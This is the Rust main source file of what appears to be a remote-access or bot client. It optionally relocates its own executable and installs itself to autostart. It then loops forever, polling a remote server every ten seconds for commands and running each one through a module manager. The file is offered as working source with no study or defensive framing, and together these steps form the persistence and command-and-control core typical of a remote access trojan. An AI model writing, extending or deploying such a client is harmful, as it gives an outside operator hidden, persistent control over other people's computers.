pub const SERVER: &str = env!("REMOTE_SERVER");
pub const AUTH_KEY: &str = env!("AUTH_KEY");
pub const CLIENT_ID: &str = env!("CLIENT_ID");

mod features;

use combine_rust::combine;
use serde::Deserialize;

pub mod module_manager;

#[tokio::main]
async fn main() {
    #[cfg(feature = "executable_move")]
    features::executable_move::auto_move_executable();

    #[cfg(feature = "auto_start")]
    features::auto_start::write_autostart();

    let api = combine::Combine::new(SERVER, "public/clientApi.js").await;

    let module_manager = module_manager::ModuleManager::new_filled();

    loop {
        let result: FetchCommandsResult = match api
            .run_combine_function(
                "fetchCommands",
                combine::CombineArguments::new()
                    .push(CLIENT_ID)
                    .push(AUTH_KEY),
            )
            .await
        {
            Ok(result) => result,
            Err(err) => {
                println!("Error {}", err);
                repeat_sleep().await;
                continue;
            }
        };

        if result.success == false {
            match result.error {
                Some(err) => {
                    println!("Error {}", err);
                    repeat_sleep().await;
                    continue;
                }
                None => {
                    println!("Error {}", "unknown error");
                    repeat_sleep().await;
                    continue;
                }
            }
        }

        for command in result.commands {
            module_manager.run_command(command, &api).await;
        }

        repeat_sleep().await;
    }
}

async fn repeat_sleep() {
    tokio::time::sleep(tokio::time::Duration::new(10, 0)).await;
}

#[derive(Deserialize)]
pub struct FetchCommand {
    module: String,
    function: String,
    args: serde_json::Value,
}

#[derive(Deserialize)]
struct FetchCommandsResult {
    success: bool,
    error: Option<u8>,
    commands: Vec<FetchCommand>,
}

#[derive(Deserialize)]
#[allow(dead_code)]
pub struct FunctionResult {
    success: bool,
    error: Option<u8>,
}
